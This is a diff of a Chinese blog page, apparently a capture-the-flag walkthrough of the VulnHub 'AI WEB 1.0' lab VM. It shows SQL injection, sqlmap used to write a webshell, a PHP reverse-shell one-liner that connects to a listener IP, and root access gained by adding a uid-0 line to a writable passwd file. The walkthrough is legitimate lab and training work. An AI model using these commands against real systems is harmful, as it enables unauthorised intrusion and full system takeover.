@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>VulnHub AI WEB 1.0 ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -114,59 +124,65 @@
           <div class="post_content">
               <p>加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。</p>
 <p>扫描端口发现只有80的对外开放端口，访问发现</p>
-<p><img src="/2019/11/AI-WEB 1.0/1572682029896.png" alt="1572682029896"></p>
+<p>![1572682029896](/2019/11/AI-WEB 1.0/1572682029896.png)</p>
 <p>扫描路径发现robots文件。其中两个路径文件，看样子是文件上传的地址。</p>
-<p><img src="/2019/11/AI-WEB 1.0/1572682020738.png" alt="1572682020738"></p>
+<p>![1572682020738](/2019/11/AI-WEB 1.0/1572682020738.png)</p>
 <p>访问其中地址，403</p>
-<p><img src="/2019/11/AI-WEB 1.0/1572682335561.png" alt="1572682335561"></p>
+<p>![1572682335561](/2019/11/AI-WEB 1.0/1572682335561.png)</p>
 <p>介于是403尝试访问上一级发现</p>
-<p><img src="/2019/11/AI-WEB 1.0/1572682385016.png" alt="1572682385016"></p>
+<p>![1572682385016](/2019/11/AI-WEB 1.0/1572682385016.png)</p>
 <p>尝试输入1，发现显示admin用户，那就是说可能这是个注入点。</p>
-<p><img src="/2019/11/AI-WEB 1.0/1572682438951.png" alt="1572682438951"></p>
+<p>![1572682438951](/2019/11/AI-WEB 1.0/1572682438951.png)</p>
 <p>检查是否存在注入，发现存在</p>
-<p><img src="/2019/11/AI-WEB 1.0/1572683771039.png" alt="1572683771039"></p>
+<p>![1572683771039](/2019/11/AI-WEB 1.0/1572683771039.png)</p>
 <p>查询systemUser库发现三个用户</p>
-<p><img src="/2019/11/AI-WEB 1.0/1572688569479.png" alt="1572688569479"></p>
-<pre><code>t00r      | FakeUserPassw0rd                    
+<p>![1572688569479](/2019/11/AI-WEB 1.0/1572688569479.png)</p>
+<pre class="line-numbers language-none"><code class="language-none">t00r      | FakeUserPassw0rd                    
 aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sa
-u3er      | N0tThis0neAls0
-</code></pre><p>扫描路径m3diNf0下的文件，发现如下地址。</p>
-<pre><code>http://192.168.111.132/m3diNf0/info.php 
-</code></pre><p>找到物理地址，利用sqlmap写shell</p>
-<p><img src="/2019/11/AI-WEB 1.0/1572705709726.png" alt="1572705709726"></p>
+u3er      | N0tThis0neAls0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>扫描路径m3diNf0下的文件，发现如下地址。</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.111.132&#x2F;m3diNf0&#x2F;info.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>找到物理地址，利用sqlmap写shell</p>
+<p>![1572705709726](/2019/11/AI-WEB 1.0/1572705709726.png)</p>
 <p>把给的路径加上物理地址都试一圈，发现如下地址是可写的。</p>
-<pre><code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/
-</code></pre><p>利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接</p>
-<pre><code>http://192.168.111.132/se3reTdir777/uploads/a.php
-</code></pre><p>来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。</p>
-<pre><code>php -r &#39;$sock=fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-</code></pre><p>获取shell后查看发现是较高版本的内核，理论上不是内核提权。</p>
-<p><img src="/2019/11/AI-WEB 1.0/image-20191102234632541.png" alt="image-20191102234632541"></p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;home&#x2F;www&#x2F;html&#x2F;web1x443290o2sdf92213&#x2F;se3reTdir777&#x2F;uploads&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.111.132&#x2F;se3reTdir777&#x2F;uploads&#x2F;a.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。</p>
+<pre class="line-numbers language-none"><code class="language-none">php -r &#39;$sock&#x3D;fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>获取shell后查看发现是较高版本的内核，理论上不是内核提权。</p>
+<p>![image-20191102234632541](/2019/11/AI-WEB 1.0/image-20191102234632541.png)</p>
 <p>查看passwd文件，发现存在账号aiweb1pwn。利用之前获得的账号登陆</p>
-<p><img src="/2019/11/AI-WEB 1.0/image-20191103002714448.png" alt="image-20191103002714448"></p>
+<p>![image-20191103002714448](/2019/11/AI-WEB 1.0/image-20191103002714448.png)</p>
 <p>但是这个账号下并没有发现有用的东西，利用suid位也没找到有用的信息。上传LinEnum.sh。来检查有用的信息。</p>
 <p>后来在查看文件信息的时候发现passwd文件居然属于www-data用户权限。</p>
-<p><img src="/2019/11/AI-WEB 1.0/image-20191103012733428.png" alt="image-20191103012733428"></p>
+<p>![image-20191103012733428](/2019/11/AI-WEB 1.0/image-20191103012733428.png)</p>
 <p>这么说我这个账号还是多余的用来。</p>
 <p>利用perl来生成加密的密码，账号密码admin</p>
-<pre><code>perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39;  //12wGaKkN1hGuw
-admin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash
-</code></pre><p>直接在蚁剑中追加一行</p>
-<p><img src="/2019/11/AI-WEB 1.0/image-20191103013158615.png" alt="image-20191103013158615"></p>
+<pre class="line-numbers language-none"><code class="language-none">perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39;  &#x2F;&#x2F;12wGaKkN1hGuw
+admin:12wGaKkN1hGuw:0:0:User_like_root:&#x2F;root:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>直接在蚁剑中追加一行</p>
+<p>![image-20191103013158615](/2019/11/AI-WEB 1.0/image-20191103013158615.png)</p>
 <p>sudo过来就已经是root权限</p>
-<p><img src="/2019/11/AI-WEB 1.0/image-20191103013307387.png" alt="image-20191103013307387"></p>
+<p>![image-20191103013307387](/2019/11/AI-WEB 1.0/image-20191103013307387.png)</p>
 <p>找到flag</p>
-<p><img src="/2019/11/AI-WEB 1.0/image-20191103013329582.png" alt="image-20191103013329582"></p>
+<p>![image-20191103013329582](/2019/11/AI-WEB 1.0/image-20191103013329582.png)</p>
 
           </div>
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2019/11/AI-WEB 1.0/">/2019/11/AI-WEB 1.0/</a>
-                    <p>发表日期：<a href="/2019/11/AI-WEB 1.0/">November 6th 2019, 4:39:05 pm</a>
-                    <p>更新日期：<a href="/2019/11/AI-WEB 1.0/">November 25th 2019, 5:29:51 pm</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2019/11/AI-WEB%201.0/">https://misakikata.github.io/2019/11/AI-WEB%201.0/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2019/11/AI-WEB%201.0/">November 6th 2019, 4:39:05 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2019/11/AI-WEB%201.0/">November 25th 2019, 5:29:51 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -204,7 +220,7 @@ admin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2019/11/AI-WEB 1.0/'; 
+            this.page.url = 'https://misakikata.github.io/2019/11/AI-WEB 1.0/'; 
             this.page.identifier = '/2019/11/AI-WEB 1.0/';
         };
         (function() { 
@@ -215,7 +231,7 @@ admin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -235,16 +251,32 @@ admin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
